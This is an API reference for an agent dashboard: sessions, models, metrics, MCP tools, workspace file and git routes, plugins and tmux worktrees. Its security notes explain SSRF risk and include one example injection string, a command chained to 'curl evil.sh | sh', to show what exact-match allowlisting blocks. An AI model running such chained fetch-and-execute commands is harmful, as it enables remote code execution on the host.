# API Documentation

> 🧭 [motor-pool](../README.md) · [Features](./FEATURES.md) · [Roadmap](./ROADMAP.md) · [Tasks](./TASKS.md) · [Changelog](./CHANGELOG.md) · [Metrics](./METRICS.md) <!-- nav -->

Complete REST API reference for the Agent Dashboard.

## Base URL

```
http://localhost:3000/api
```

## Authentication

No authentication required in the current release.

## Common Response Format

### Success
```json
{ "success": true, "data": { } }
```

### Error
```json
{ "success": false, "error": "Error message" }
```

### HTTP Status Codes

| Code | Meaning |
|------|---------|
| 200 | Success |
| 202 | Accepted (async operation started) |
| 400 | Bad request / invalid parameters |
| 404 | Resource not found |
| 409 | Conflict (e.g. duplicate feedback) |
| 501 | Feature disabled (e.g. Docker control off) |
| 502 | Upstream service error |
| 500 | Internal server error |

---

## Sessions

### Create Session

```
POST /api/sessions
Content-Type: application/json
```

**Body**

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `endpoint` | string | | `"primary"` | LLM endpoint key (`primary`, `docker_runner`, `glm_flash`, `openllm`) |
| `model` | string | | endpoint default | Model name; coerced to a valid model for the endpoint if needed |
| `name` | string | | `"session-N"` | Human-readable label |
| `userId` | string | | `"anonymous"` | Caller identity |
| `userRole` | string | | `null` | Caller role (passed to safety layer) |
| `experience` | string | | `"developer"` | Experience key — see `GET /api/experiences` |
| `safetyMode` | string | | experience default | Safety policy override (`strict`, `standard`, `off`) |

**Response**
```json
{
  "success": true,
  "session": {
    "id": "sess_1710864000000_abc123xyz",
    "name": "session-1",
    "model": "llama3.2:3b",
    "endpoint": "primary",
    "experience": "developer",
    "safetyMode": "standard",
    "endpointAdjusted": false,
    "createdAt": "2026-03-19T10:00:00.000Z"
  }
}
```

`endpointAdjusted: true` means the requested endpoint was overridden by the experience's policy (e.g. `safechat` always uses `primary`).

**Errors:** 400 invalid experience, 400 invalid safetyMode

---

### List Sessions

```
GET /api/sessions
```

```json
{
  "success": true,
  "sessions": [
    {
      "id": "sess_1710864000000_abc123xyz",
      "name": "session-1",
      "model": "llama3.2:3b",
      "endpoint": "primary",
      "messageCount": 5,
      "experience": "developer",
      "safetyMode": "standard",
      "userId": "anonymous",
      "createdAt": "2026-03-19T10:00:00.000Z",
      "updatedAt": "2026-03-19T10:05:00.000Z"
    }
  ]
}
```

---

### Get Session

```
GET /api/sessions/:id
```

Returns the session object plus full `messages` array. Each message:

```json
{
  "role": "user",
  "content": "What is 2+2?",
  "timestamp": "2026-03-19T10:00:05.000Z"
}
```

Assistant messages may also have `feedback: "up" | "down"` and `feedbackAt`.

**Errors:** 404 session not found

---

### Send Message

```
POST /api/sessions/:id/message
Content-Type: application/json
```

**Body**

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `message` | string | ✅ | | User message |
| `useSafeMode` | boolean | | `false` | Apply the dashboard safety policy and disable experience tools for this turn |

**Response**
```json
{
  "success": true,
  "response": "AI response text",
  "endpoint": "primary",
  "messageCount": 2
}
```

**Errors:** 400 missing message, 404 session not found, 500 LLM unavailable

---

### Stream Message

```
POST /api/sessions/:id/stream
Content-Type: application/json
```

Same body as Send Message. Response is `text/event-stream` (SSE), with a JSON object in each `data:` frame:

| `type` | Fields | Meaning |
| --- | --- | --- |
| `token` | `content` | Assistant text chunk. Tool-enabled experiences stream model output while it arrives. |
| `reset` | — | Discard provisional text when the model switches to a tool call or output controls replace streamed text. |
| `tool_call` | `tool`, `args`, `result` | A tool call completed. |
| `done` | `messageCount`, optional `blocked`, `redacted`, `truncated` | The turn finished and its final response was persisted. |
| `error` | `message` | The turn failed or the upstream stream stalled. |

In strict output-filter modes, assistant text is buffered and one sanitized `token` frame is sent after the complete turn. Disconnecting aborts the active model stream and finalizes the session state.

---

### Switch Endpoint / Model

```
PUT /api/sessions/:id/model
Content-Type: application/json
```

**Body**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `endpoint` | string | ✅ | Endpoint key |
| `model` | string | | Model name (defaults to endpoint's configured model) |

**Response**
```json
{
  "success": true,
  "message": "Switched to primary",
  "session": {
    "endpoint": "primary",
    "model": "llama3.2:3b",
    "llmUrl": "http://ollama:8080"
  }
}
```

Conversation history is preserved. **Errors:** 400 invalid endpoint

---

### Record Feedback

```
POST /api/sessions/:id/feedback
Content-Type: application/json
```

**Body**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `messageIndex` | integer | ✅ | Zero-based index into the session's messages array |
| `positive` | boolean | ✅ | `true` = thumbs up, `false` = thumbs down |

**Response**
```json
{ "success": true, "recorded": "feedback_positive" }
```

**Errors:** 400 missing/invalid fields, 404 session not found, 409 feedback already recorded

---

### Delete Session

```
DELETE /api/sessions/:id
```

```json
{ "success": true, "deleted": true }
```

This ends the session and removes it from the active session map. Later snapshot writes omit the session and its message history from `data/sessions-snapshot.json`. When Postgres is enabled, the ended record and messages remain there; this is not a hard-delete or history-erasure operation. Export history you need before ending a session. `deleted` is `false` if the session did not exist.

---

## System & Service Lifecycle

### List Services

```
GET /api/system/services
```

Returns the service registry with live health probes for each service.

```json
{
  "success": true,
  "dockerControlEnabled": false,
  "inDocker": true,
  "services": {
    "ollama": {
      "key": "ollama",
      "name": "Ollama",
      "running": true,
      "status": "healthy",
      "resolvedUrl": "http://ollama:8080",
      "controllable": true,
      "composeService": "ollama"
    },
    "bb_mcp": {
      "key": "bb_mcp",
      "name": "Blackboard MCP",
      "running": false,
      "status": "disabled",
      "resolvedUrl": null,
      "controllable": false,
      "disabledReason": "BB_MCP_ENABLED is false"
    }
  },
  "primaryLlm": {
    "resolvedUrl": "http://ollama:8080",
    "discovered": false,
    "candidates": ["http://ollama:8080", "http://host.docker.internal:8081"]
  }
}
```

`status` is one of `healthy`, `unavailable`, or `disabled`.

`controllable: true` means the service responds to start/stop/restart (also requires `dockerControlEnabled`).

---

### Service Action (start / stop / restart)

```
POST /api/system/services/:serviceKey/:action
```

`:action` must be `start`, `stop`, or `restart`.

Requires `AGENT_BOARD_ENABLE_DOCKER_CONTROL=true` — see [docker-control overlay](../README.md#docker-control--model-pulls-opt-in).

**Response**
```json
{
  "success": true,
  "serviceKey": "ollama",
  "action": "restart",
  "result": "Container agent-ollama restarting..."
}
```

**Errors:** 400 invalid action, 400 service not controllable, 404 unknown serviceKey, 501 Docker control disabled

---

### System Info

```
GET /api/system/info
```

```json
{
  "success": true,
  "system": {
    "platform": "linux",
    "nodeVersion": "v22.0.0",
    "uptime": 3600,
    "memory": { "rss": 12345678, "heapUsed": 9876543 },
    "inDocker": true,
    "environment": {
      "port": 3000,
      "llmEndpoints": ["primary", "docker_runner", "glm_flash"],
      "dockerControlEnabled": false,
      "persistence": { "configured": true, "enabled": true },
      "tracing": { "enabled": false }
    }
  }
}
```

---

## Models

### List Models

```
GET /api/models
```

Aggregates available models from all configured LLM endpoints.

```json
{
  "success": true,
  "models": [
    {
      "id": "primary",
      "endpoint": "Ollama (primary)",
      "endpointUrl": "http://ollama:8080",
      "type": "ollama",
      "name": "llama3.2:3b"
    },
    {
      "id": "docker_runner",
      "endpoint": "Docker Model Runner",
      "endpointUrl": "http://model-runner.docker.internal/engines/llama.cpp/v1",
      "type": "openai",
      "name": "ai/qwen3-coder:latest"
    }
  ]
}
```

---

### Pull a Model

```
POST /api/models/pull
Content-Type: application/json
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `endpoint` | string | ✅ | Endpoint key (`primary`, `docker_runner`, `glm_flash`) |
| `model` | string | | Model name — defaults to the endpoint's configured model |

**Response** (202 Accepted — pull is async)
```json
{
  "success": true,
  "pullKey": "primary:llama3.2:3b",
  "endpoint": "primary",
  "model": "llama3.2:3b",
  "status": "pulling"
}
```

Progress events are emitted on the `/ws/events` WebSocket as `model_pull_progress`.

Docker Model Runner pulls (`docker_runner`, `glm_flash`) require `AGENT_BOARD_ENABLE_DOCKER_CONTROL=true`.

**Errors:** 400 unknown endpoint, 400 no model specified, 501 Docker control required but disabled

---

### Pull Status

```
GET /api/models/pull-status
```

```json
{
  "success": true,
  "pulls": {
    "primary:llama3.2:3b": {
      "status": "done",
      "endpoint": "primary",
      "model": "llama3.2:3b"
    }
  }
}
```

`status` is one of `pulling`, `done`, or `error`.

---

## Status

### Persistence Status

```
GET /api/persistence/status
```

```json
{
  "success": true,
  "persistence": {
    "configured": true,
    "enabled": true,
    "url": "postgresql://agent:***@agent-db:5432/agent_board"
  }
}
```

`configured` — `DATABASE_URL` is set. `enabled` — the Postgres connection is live and sessions are being persisted.

---

### Tracing Status

```
GET /api/tracing/status
```

```json
{
  "success": true,
  "tracing": {
    "enabled": false,
    "initialized": false,
    "endpoint": null
  }
}
```

Enable tracing with `OTEL_ENABLED=true` and `--profile observability` — see [.env.example](../.env.example).

---

## Metrics

All metrics are derived from the in-memory event bus and reset on server restart.

### Summary

```
GET /api/metrics/summary
```

```json
{
  "success": true,
  "summary": {
    "totalSessions": 12,
    "activeSessions": 3,
    "totalMessages": 47,
    "avgMessagesPerSession": 3.9,
    "modelDistribution": { "llama3.2:3b": 30, "ai/qwen3-coder:latest": 17 },
    "experienceDistribution": { "developer": 8, "research": 3, "safechat": 1 }
  }
}
```

---

### Safety

```
GET /api/metrics/safety
```

```json
{
  "success": true,
  "safety": {
    "totalClassified": 47,
    "classificationBreakdown": { "safe": 42, "sensitive": 3, "blocked": 2 },
    "totalBlocked": 2,
    "blockReasons": { "harmful_content": 1, "prompt_injection": 1 },
    "totalOutputsFiltered": 1,
    "filterTypes": { "pii": 1 },
    "recentBlocked": [
      { "timestamp": "2026-03-19T10:30:00.000Z", "session_id": "sess_...", "reason": "harmful_content" }
    ]
  }
}
```

---

### Feedback

```
GET /api/metrics/feedback
```

```json
{
  "success": true,
  "feedback": {
    "totalPositive": 8,
    "totalNegative": 2,
    "byModel": {
      "llama3.2:3b": { "positive": 6, "negative": 1 }
    },
    "byExperience": {
      "developer": { "positive": 5, "negative": 2 }
    }
  }
}
```

---

### Errors

```
GET /api/metrics/errors
```

```json
{
  "success": true,
  "errors": {
    "total": 3,
    "errorRatePercent": 6.4,
    "byModel": { "llama3.2:3b": 3 },
    "recentCount": 1,
    "recent": [
      {
        "timestamp": "2026-03-19T10:30:00.000Z",
        "session_id": "sess_...",
        "model": "llama3.2:3b",
        "error": "connect ECONNREFUSED"
      }
    ]
  }
}
```

---

## Experiences

### List Experiences

```
GET /api/experiences
```

```json
{
  "success": true,
  "experiences": [
    {
      "key": "developer",
      "name": "Developer Assistant",
      "description": "Unrestricted coding and research mode",
      "allowedEndpoints": ["primary", "docker_runner", "glm_flash", "openllm"],
      "defaultSafetyMode": "standard"
    },
    {
      "key": "research",
      "name": "Research Mode",
      "description": "Extended reasoning, web-aware prompts",
      "allowedEndpoints": ["primary", "docker_runner"],
      "defaultSafetyMode": "standard"
    },
    {
      "key": "safechat",
      "name": "Safe Chat",
      "description": "Strict safety policy, primary endpoint only",
      "allowedEndpoints": ["primary"],
      "defaultSafetyMode": "strict"
    }
  ],
  "demoMode": { "enabled": false, "enforcedExperience": null }
}
```

When `demoMode.enabled` is `true`, all sessions are forced into `enforcedExperience`.

---

## MCP Tool Servers

### Tool Server Status

```
GET /api/tools
```

```json
{
  "success": true,
  "dockerControlEnabled": false,
  "tools": [
    {
      "key": "content_gen",
      "name": "Content Studio",
      "description": "AI short-video generation via MoneyPrinterTurbo",
      "url": "http://tool-content-gen:3200",
      "serviceKey": "tool_content_gen",
      "composeService": "tool-content-gen",
      "ports": [3200],
      "running": false,
      "status": "unavailable",
      "health": null
    }
  ]
}
```

Start tool servers with the repository Compose file and root environment file: `docker compose --env-file .env -f config/docker-compose.yml --profile tools up -d tool-content-gen tool-website`.

---

### List Tools for a Server

```
GET /api/tools/:toolKey/tools
```

`:toolKey` is `content_gen` or `website`.

```json
{
  "success": true,
  "tools": [
    {
      "name": "generate_video",
      "description": "Generate an AI short video from a topic",
      "inputSchema": { "type": "object", "properties": { "topic": { "type": "string" } } }
    }
  ]
}
```

**Errors:** 404 unknown toolKey, 502 tool server unreachable

---

### Call a Tool

```
POST /api/tools/:toolKey/call
Content-Type: application/json
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `name` | string | ✅ | MCP tool name (from the tools list above) |
| `arguments` | object | | Tool input arguments matching the tool's `inputSchema` |

**Response**
```json
{
  "success": true,
  "tool": "generate_video",
  "isError": false,
  "content": "Video job started. ID: job_abc123",
  "raw": { "content": [{ "type": "text", "text": "..." }] }
}
```

`isError: true` means the MCP server returned an error result (as opposed to a transport failure). The HTTP status is still 200 in this case; check `isError`.

**Errors:** 404 unknown toolKey, 400 missing tool name, 502 tool server unreachable or timed out

---

## Workspace File I/O

The workspace routes require `WORKSPACE_PATH` to be set in `.env` and the `docker-compose.workspace.yml` overlay to be applied. Paths are sandboxed to `WORKSPACE_ROOT` — attempts to escape via `..` are rejected.

### Status

```
GET /api/workspace/status
```

```json
{
  "configured": true,
  "root": "/workspace-root/my-project",
  "git": { "repo": true, "branch": "main", "dirty": false, "ahead": 0 }
}
```

`configured: false` when `WORKSPACE_PATH` is unset or the path doesn't exist.

---

### List Directory

```
GET /api/workspace/ls?path=src/components
```

```json
{
  "path": "src/components",
  "entries": [
    { "name": "App.jsx", "type": "file", "size": 4096, "modified": "2026-03-19T10:00:00.000Z" },
    { "name": "shared", "type": "dir" }
  ]
}
```

---

### Read File

```
GET /api/workspace/read?path=src/App.jsx
```

```json
{ "path": "src/App.jsx", "content": "import React from 'react';\n..." }
```

Files > 1 MB are rejected (413).

---

### Write File

```
POST /api/workspace/write
Content-Type: application/json
```

```json
{ "path": "src/App.jsx", "content": "import React from 'react';\n..." }
```

**Response**
```json
{ "path": "src/App.jsx", "bytes": 1234 }
```

Parent directories are created automatically.

---

### Git Status

```
GET /api/workspace/git/status
```

```json
{
  "branch": "main",
  "files": [
    { "status": "M", "file": "src/App.jsx" }
  ]
}
```

---

### Git Commit

```
POST /api/workspace/git/commit
Content-Type: application/json
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `message` | string | ✅ | Commit message |
| `files` | string[] | | Files to stage; if omitted, `git add -A` is used |

**Response**
```json
{ "sha": "a1b2c3d", "branch": "main", "message": "feat: update app" }
```

---

### Git Push

```
POST /api/workspace/git/push
```

```json
{ "branch": "main" }
```

---

## Health

### Health Check

```
GET /api/health
```

```json
{
  "status": "ok",
  "timestamp": "2026-03-19T10:30:00.000Z",
  "endpoints": {
    "primary": "healthy",
    "docker_runner": "unavailable"
  }
}
```

---

## Task Queue

Lightweight in-memory task queue for cross-session coordination.

### List Tasks

```
GET /api/tasks?status=pending&sessionId=sess_...
```

```json
{
  "success": true,
  "tasks": [
    {
      "id": "task_abc",
      "title": "Investigate latency spike",
      "status": "pending",
      "priority": "high",
      "sessionId": "sess_...",
      "createdAt": "2026-03-19T10:00:00.000Z"
    }
  ],
  "summary": { "total": 1, "byStatus": { "pending": 1, "in_progress": 0, "blocked": 0, "completed": 0 } }
}
```

Valid `status` values: `pending`, `in_progress`, `blocked`, `completed`.

---

### Create Task

```
POST /api/tasks
Content-Type: application/json
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `title` | string | ✅ | Short task description |
| `description` | string | | Longer detail |
| `priority` | string | | `low`, `medium`, `high`, `urgent` (default `medium`) |
| `sessionId` | string | | Session to assign the task to |

**Errors:** 400 missing title, 400 invalid priority, 400 sessionId not found

---

### Update Task

```
PUT /api/tasks/:id
Content-Type: application/json
```

Any subset of `{ status, priority, sessionId }`.

---

### Delete Task

```
DELETE /api/tasks/:id
```

---

### Tasks for a Session

```
GET /api/sessions/:id/tasks
```

---

## Webhooks

### Trigger Event

```
POST /api/webhooks/trigger
Content-Type: application/json
```

```json
{
  "event": "ci_fail",
  "source": "github-actions",
  "payload": { "runId": 1422, "branch": "main" },
  "createTask": {
    "title": "Fix failing CI run",
    "priority": "high",
    "sessionId": "sess_..."
  }
}
```

Valid `event` values: `ci_pass`, `ci_fail`, `deploy`, `deploy_fail`, `alert`, `review_requested`, `pr_merged`, `custom`.

`createTask` is optional. **Errors:** 400 missing/invalid event, 400 invalid source, 400 sessionId not found.

---

## Quick Reference

| Verb | Path | Description |
|------|------|-------------|
| GET | `/api/health` | Health check |
| GET | `/api/models` | All available models |
| POST | `/api/models/pull` | Pull a model (async) |
| GET | `/api/models/pull-status` | Pull progress |
| GET | `/api/system/services` | Service registry + live health |
| POST | `/api/system/services/:key/:action` | start / stop / restart a service |
| GET | `/api/system/info` | Node/platform/environment info |
| GET | `/api/experiences` | Available experience configs |
| GET | `/api/tools` | MCP tool server status |
| GET | `/api/tools/:key/tools` | List a server's MCP tools |
| POST | `/api/tools/:key/call` | Execute an MCP tool |
| POST | `/api/sessions` | Create session |
| GET | `/api/sessions` | List sessions |
| GET | `/api/sessions/:id` | Get session + messages |
| POST | `/api/sessions/:id/message` | Send message |
| POST | `/api/sessions/:id/stream` | Stream message (SSE) |
| PUT | `/api/sessions/:id/model` | Switch endpoint/model |
| POST | `/api/sessions/:id/feedback` | Record thumbs up/down |
| DELETE | `/api/sessions/:id` | Delete session |
| GET | `/api/sessions/:id/tasks` | Tasks for a session |
| GET | `/api/tasks` | List all tasks |
| POST | `/api/tasks` | Create task |
| PUT | `/api/tasks/:id` | Update task |
| DELETE | `/api/tasks/:id` | Delete task |
| POST | `/api/webhooks/trigger` | Ingest an external event |
| GET | `/api/metrics/summary` | Session + message totals |
| GET | `/api/metrics/safety` | Safety classification + block metrics |
| GET | `/api/metrics/feedback` | Thumbs up/down by model + experience |
| GET | `/api/metrics/errors` | Error rate + recent failures |
| GET | `/api/persistence/status` | Postgres persistence status |
| GET | `/api/tracing/status` | OpenTelemetry tracing status |
| GET | `/api/workspace/status` | Workspace mount status + git info |
| GET | `/api/workspace/ls` | List workspace directory |
| GET | `/api/workspace/read` | Read workspace file |
| POST | `/api/workspace/write` | Write workspace file |
| GET | `/api/workspace/git/status` | Workspace git status |
| POST | `/api/workspace/git/commit` | Commit workspace changes |
| POST | `/api/workspace/git/push` | Push workspace branch |
| GET | `/api/plugins` | List loaded plugin manifests |
| GET | `/api/plugins/tools` | Flat namespaced plugin tool list |
| GET | `/api/plugins/:name` | Single plugin manifest |
| POST | `/api/plugins/reload` | Re-scan the plugins directory |
| POST | `/api/plugins/:name/tools/:tool/invoke` | Call a plugin tool |
| POST | `/api/plugins/:name/events` | Emit a declared plugin event |
| GET | `/api/worktrees` | List agent tmux worktrees |
| POST | `/api/worktrees` | Launch an agent in a tmux worktree |
| DELETE | `/api/worktrees/:slug` | Kill window + remove worktree |

---

---

## Plugins

A plugin extends the dashboard with tools and events **without modifying core
server code**. Plugins are declarative JSON manifests placed in
`dashboard/config/plugins/*.plugin.json` — the same "drop a file in a config
directory" pattern as `config/mcp-registry.json`.

Manifests are pure data. Nothing in a manifest is executed at load time, so a
malformed or hostile file can only ever be rejected, never run. Invalid
manifests are logged and skipped; they never prevent the dashboard from booting.

Override the directory with `AGENT_BOARD_PLUGINS_DIR`.

> **Security — treat the plugins directory as trusted input.**
> "Not executed" is not the same as "harmless". A manifest names an http(s) host
> that the dashboard will then call on request, so anyone who can write to
> `dashboard/config/plugins/` can make the dashboard issue arbitrary HTTP
> requests from its own network position — including to hosts reachable only
> from inside the Docker network (SSRF). There is no plugin sandbox, no
> egress allow-list, and no per-plugin authentication.
>
> Mitigations in place: only `http(s)` URLs are accepted, redirects are not
> followed (`maxRedirects: 0`), request arguments are capped at 256 KB, response
> bodies at 8 MB, and every tool has a bounded timeout (default 15s, max 120s).
>
> Give the plugins directory the same level of trust as the compose files. Do
> not point it at a location writable by untrusted users, and do not load
> third-party manifests you have not read.

### Manifest shape (v1)

```json
{
  "manifestVersion": 1,
  "name": "example-echo",
  "version": "1.0.0",
  "description": "What this plugin does",
  "enabled": true,
  "baseUrl": "${EXAMPLE_ECHO_URL:-http://tool-content-gen:3200}",
  "tools": [
    {
      "name": "echo",
      "description": "Echo a message back",
      "transport": "http",
      "method": "POST",
      "path": "/echo",
      "timeoutMs": 10000,
      "parameters": {
        "type": "object",
        "properties": { "message": { "type": "string" } },
        "required": ["message"]
      }
    }
  ],
  "events": {
    "channel": "plugins",
    "emits": ["example-echo.invoked", "example-echo.failed"]
  }
}
```

| Field | Required | Notes |
|-------|----------|-------|
| `manifestVersion` | no | Defaults to `1`; other values are rejected |
| `name` | **yes** | `[a-z0-9][a-z0-9_-]{0,63}`, unique across all plugins |
| `version` | **yes** | semver, e.g. `1.0.0` |
| `enabled` | no | Defaults to `true` |
| `baseUrl` | no* | Default host for tools; must be `http(s)` |
| `tools[].name` | **yes** | `[a-zA-Z0-9_-]{1,64}`, unique within the plugin |
| `tools[].transport` | no | Only `http` today; anything else is rejected |
| `tools[].method` | no | `GET`/`POST`/`PUT`/`PATCH`/`DELETE`, defaults `POST` |
| `tools[].url` | no* | Per-tool host override |
| `tools[].path` | no | Appended to `url ?? baseUrl`; must start with `/` |
| `tools[].timeoutMs` | no | Defaults 15s, clamped to 1s–120s |
| `tools[].parameters` | no | Free-form JSON schema, surfaced to agents |
| `events.channel` | no | Event-bus channel, defaults `plugins` |
| `events.emits` | no | Allow-list of event types the plugin may emit |

\* A tool needs a host from either `tools[].url` or the plugin-level `baseUrl`;
a tool with neither is rejected.

`${VAR}` and `${VAR:-default}` are expanded from the environment at load time,
matching the MCP registry's behavior.

### Registration

Plugins are registered by **file placement**, not by code:

1. Drop `<name>.plugin.json` into `dashboard/config/plugins/`.
2. Restart the dashboard, or `POST /api/plugins/reload` to re-scan without one.
3. `GET /api/plugins` shows what loaded and, in `errors`, what was rejected and why.

`dashboard/config/plugins/example-echo.plugin.json` ships as a working reference.

### Invoking a tool

```bash
curl -X POST http://localhost:3000/api/plugins/example-echo/tools/echo/invoke \
  -H 'Content-Type: application/json' \
  -d '{"arguments": {"message": "hello"}}'
```

Arguments go in `arguments` (a bare body is also accepted) and are capped at
256 KB. `GET`/`DELETE` tools receive them as query params, others as a JSON body.
An unreachable backend returns `503` with the reason; a non-2xx backend response
returns `502`. Both include `durationMs`.

### Emitting events

```bash
curl -X POST http://localhost:3000/api/plugins/example-echo/events \
  -H 'Content-Type: application/json' \
  -d '{"event_type": "example-echo.invoked", "metadata": {"via": "curl"}}'
```

A plugin may only emit event types it declared in `events.emits` — it cannot
spoof arbitrary dashboard events. Accepted events are published to the plugin's
event-bus channel, so they flow to `/api/channels/:name/history` and to
WebSocket subscribers like any other dashboard event.

### Agent runtime access

Beyond the HTTP API above, enabled plugin tools are also merged directly into
the model's tool list for the **developer**, **research**, and **website**
experiences — an agent can call a plugin tool on its own mid-conversation, not
just via a manual `curl` to the invoke endpoint. Each tool is exposed as a
`<plugin>__<tool>` function-call name (double underscore, since a literal `.`
— used in `qualifiedName` above — isn't a valid OpenAI/Ollama function-call
name character). `[a-zA-Z0-9_-]` alone would let a name legally contain
`__`, making that join ambiguous; manifest validation additionally rejects
`__` inside a plugin or tool name specifically to keep this encoding
collision-free. The call routes through the same HTTP invocation as
`POST /api/plugins/:name/tools/:tool/invoke`.

Plain chat and Safe Chat sessions still get zero tools, plugin or otherwise —
enabling a plugin cannot change behavior in those experiences.

---

## tmux Multi-Agent Worktrees

Spawns parallel agent instances, each isolated in its own tmux window with its
own git worktree, so several agents can work on the same repo without colliding.

**Disabled by default.** Set `AGENT_BOARD_ENABLE_TMUX=true` to allow the
dashboard to spawn processes — the same opt-in shape as
`AGENT_BOARD_ENABLE_DOCKER_CONTROL`. While disabled, `GET` reports
`enabled: false` and the mutating routes return `503` naming the env var.

> **Security — this endpoint runs commands, and the dashboard has no auth.**
>
> **The route is unauthenticated. That is unmitigated by design in this feature**
> — the dashboard ships with no authentication or authorization on *any* route
> (there is no auth middleware in `server.js`), and this endpoint inherits that
> posture. A reverse proxy can control *who* reaches the port, but it cannot
> constrain what an authorized caller may then execute, so it does not close
> this gap. Per-route auth is genuine repo-wide work and is not solved here.
>
> Because the route cannot authenticate callers, **what it is willing to execute
> is gated instead**, via two independent switches:
>
> | Env var | Default | Grants |
> |---------|---------|--------|
> | `AGENT_BOARD_ENABLE_TMUX` | off | create worktrees and **empty** tmux windows |
> | `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | empty | run the listed commands |
>
> With the allowlist empty — the default, even when the feature is fully enabled
> — any request carrying a `command` is refused with `403` and this route cannot
> execute anything at all. Enabling the feature alone does **not** grant remote
> command execution; an operator must additionally name each permitted command.
>
> Matching is **exact**, never prefix-based: allowing `npm test` does not admit
> `npm test; curl evil.sh | sh`, because tmux runs the string in a shell and a
> prefix rule would be trivially bypassable.
>
> Also bounded: worktree names are slugified to `[a-z0-9][a-z0-9-]{0,39}` and
> rejected otherwise, branch names are pattern-checked, commands are capped at
> 2000 chars, and every argument is passed via `execFile` as a single argv
> element — so callers cannot inject extra commands through the slug or branch.
>
> Residual risk, stated plainly: with `AGENT_BOARD_ENABLE_TMUX=true`, any client
> that can reach the port can create and delete worktrees and tmux windows, and
> can run any command the operator has allowlisted. Only enable it on a host you
> control, bound to a trusted interface, and keep the allowlist minimal.

### Session naming scheme

| Element | Pattern | Example |
|---------|---------|---------|
| tmux session | `agentboard` | `agentboard` |
| tmux window | `ab-<slug>` | `ab-refactor-auth` |
| tmux target | `<session>:ab-<slug>` | `agentboard:ab-refactor-auth` |
| git branch | `agent/<slug>` | `agent/refactor-auth` |
| worktree path | `<worktree-root>/<slug>` | `/workspace/.worktrees/refactor-auth` |

`<slug>` is derived from the requested name: lowercased, non-alphanumerics
collapsed to `-`, trimmed, capped at 40 chars, and required to match
`[a-z0-9][a-z0-9-]{0,39}`. A name that cannot reduce to a valid slug is
rejected with `400` before any command runs — this is also what keeps shell
metacharacters out of the tmux and git argv.

One flat session with one window per agent means `tmux attach -t agentboard`
then `Ctrl-b w` gives a human the full picture of every running agent, and
`tmux kill-window -t agentboard:ab-<slug>` cleanly stops just one.

**Configuration:**

| Env var | Default | Purpose |
|---------|---------|---------|
| `AGENT_BOARD_ENABLE_TMUX` | `false` | Master opt-in switch |
| `AGENT_BOARD_TMUX_SESSION` | `agentboard` | Session name |
| `AGENT_BOARD_WORKTREE_ROOT` | `$WORKSPACE_ROOT/.worktrees` | Where worktrees are checked out |
| `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | *(empty)* | Comma-separated, exact-match allowlist of commands `POST` may run. Empty means no command may be executed. |
| `AGENT_BOARD_TMUX_EXEC_TIMEOUT_MS` | `30000` | Timeout for each `tmux`/`git` invocation. Clamped to 1s–10m; invalid values fall back to the default. |

### Launch an agent

```bash
curl -X POST http://localhost:3000/api/worktrees \
  -H 'Content-Type: application/json' \
  -d '{"name": "Refactor Auth"}'
```

```json
{
  "success": true,
  "worktree": {
    "slug": "refactor-auth",
    "session": "agentboard",
    "window": "ab-refactor-auth",
    "target": "agentboard:ab-refactor-auth",
    "branch": "agent/refactor-auth",
    "path": "/workspace/.worktrees/refactor-auth",
    "worktreeCreated": true,
    "commandSent": false,
    "attachCommand": "tmux attach -t agentboard \\; select-window -t ab-refactor-auth"
  }
}
```

`command` is optional and, under the default empty
`AGENT_BOARD_TMUX_ALLOWED_COMMANDS` shown above, any value refuses the request
with `403` before anything is created — so the example omits it. To also send a
command, first configure the allowlist:

```bash
AGENT_BOARD_TMUX_ALLOWED_COMMANDS="npm test" npm start
curl -X POST http://localhost:3000/api/worktrees \
  -H 'Content-Type: application/json' \
  -d '{"name": "Refactor Auth", "command": "npm test"}'
# → "commandSent": true, sent to the new window with `tmux send-keys`
```

A slug that already has a window returns `409` rather than launching a second
agent into it. Emits `worktree_created` on the event bus.

**Isolation is enforced, never degraded.** A launch either gets its own checkout
or fails — it will not fall back to the shared worktree root, because that would
put concurrent agents in one working tree:

| Failure | Result |
|---------|--------|
| `WORKSPACE_ROOT` unset | `503`, nothing created |
| `git worktree add` fails | `503`, no tmux window created |
| `tmux new-window` fails | `503`, worktree rolled back — `rolledBack: true` only if the removal itself also succeeded; otherwise `rolledBack: false` with a `warning` naming the checkout path |
| `tmux send-keys` fails | `503`, window killed **and** worktree rolled back — same `rolledBack`/`warning` contract: rollback requires both the window to be gone **and** the worktree removal to succeed |

Rollback is attempted in every case above, but is not guaranteed to succeed
(e.g. a locked working tree can make `git worktree remove` itself fail) — check
`rolledBack` and `warning` in the response rather than assuming success from the
`503` alone.

### List and tear down

```bash
curl http://localhost:3000/api/worktrees
curl -X DELETE http://localhost:3000/api/worktrees/refactor-auth
curl -X DELETE 'http://localhost:3000/api/worktrees/refactor-auth?keepWorktree=true'
```

`DELETE` kills the tmux window and removes the git worktree; pass
`?keepWorktree=true` to keep the checkout for inspection. Emits
`worktree_removed`. The dashboard UI exposes all of this through the **Agents**
dropdown in the top bar.

**Teardown will not destroy live work.** `git worktree remove --force` discards
uncommitted changes, so it only runs once the window is confirmed gone:

| `tmux kill-window` result | Result |
|---------------------------|--------|
| succeeded | worktree removed, `200 success: true` |
| window/session did not exist | treated as orphan cleanup — worktree removed, `200` |
| failed for any other reason (busy, locked, permissions) | **`409`, worktree left untouched** — an agent may still be working in it |
| tmux not installed | `503` |
| removal itself failed | `500 success: false`, reporting that the checkout is still on disk |

The endpoint never reports `success: true` while the window survived or the
checkout is still present — except with `?keepWorktree=true`, where retaining
the checkout is the intended outcome: that request reports `200 success: true`
once the window is gone, with the checkout deliberately left behind for
inspection rather than removed.

---

## Model Lifecycle

These endpoints manage the pull and unload lifecycle of models across Ollama and
Docker Model Runner backends.

### List Available Models

```
GET /api/models
```

Returns models available at each configured endpoint. Falls back to the configured
`defaultModel` if the endpoint is unreachable.

**Response**
```json
{
  "success": true,
  "models": [
    {
      "id": "primary",
      "endpoint": "Ollama (local)",
      "endpointUrl": "http://ollama:8080",
      "backendType": "ollama-container",
      "type": "general",
